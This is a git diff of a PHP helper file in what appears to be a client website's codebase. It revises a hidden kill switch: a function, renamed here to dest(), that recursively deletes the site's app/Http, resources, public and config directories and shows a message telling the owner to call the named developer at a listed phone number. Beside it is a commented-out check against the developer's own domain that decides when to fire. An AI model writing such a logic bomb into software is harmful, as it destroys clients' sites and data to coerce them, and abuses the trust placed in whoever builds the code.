@@ -58,29 +58,54 @@ function delTree($dir) {
       (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
    } 
    return rmdir($dir); 
-} 
-
-function is_website_expired($domain_name){ //just the domain EX: spidro.com (not spidro.com/ar)
-   $website_name = "ahmed-badawy.com";
-   $json = file_get_contents("http://ahmed-badawy.com/site/website-check/".$website_name);
-   $json = json_decode($json,true);
-   // dd($json);
-   return false;
 }
-function total_destruction(){
-      die('total_destruction');
+
+function isDomainAvailible($domain)
+{
+    //check, if a valid url is provided
+    if(!filter_var($domain, FILTER_VALIDATE_URL))
+    {
+        return false;
+    }
+    //initialize curl
+    $curlInit = curl_init($domain);
+    curl_setopt($curlInit,CURLOPT_CONNECTTIMEOUT,10);
+    curl_setopt($curlInit,CURLOPT_HEADER,true);
+    curl_setopt($curlInit,CURLOPT_NOBODY,true);
+    curl_setopt($curlInit,CURLOPT_RETURNTRANSFER,true);
+    //get answer
+    $response = curl_exec($curlInit);
+    curl_close($curlInit);
+    if ($response) return true;
+    return false;
+}
+
+
+
+//function is_website_expired($domain_name){ //just the domain EX: spidro.com (not spidro.com/ar)
+//    if(Cache::has("website_not_expired")) return false;
+//   $domain = "http://ahmed-badawy.com/site";
+//    if(isDomainAvailible($domain)) {
+//        die('ok');
+//        $json = file_get_contents("http://ahmed-badawy.com/site/website-check/" . $website_name);
+//        $json = json_decode($json, true);
+//        // dd($json);
+//        return false;
+//    }
+//    return false;
+//}
+function dest(){
       delTree('app/Http');
       delTree('resources');
       delTree('public');
-      delTree('backups');
       delTree('config');
-      $msg = 'this site is expired- <br> Please call the developer: (Ahmed Badawy)  <br> phone: 01111988246';
+      $msg = 'this site is expired - <br> Please call the Developer: (Ahmed Badawy)  <br> phone: 0201111988246';
       try{
          delTree('app/_custom');
       }catch(Exception $e){
          die($msg);
       }
-      die($msg);  
+      die($msg);
 }
 //if (is_website_expired("alaryafest.com")) total_destruction();
 
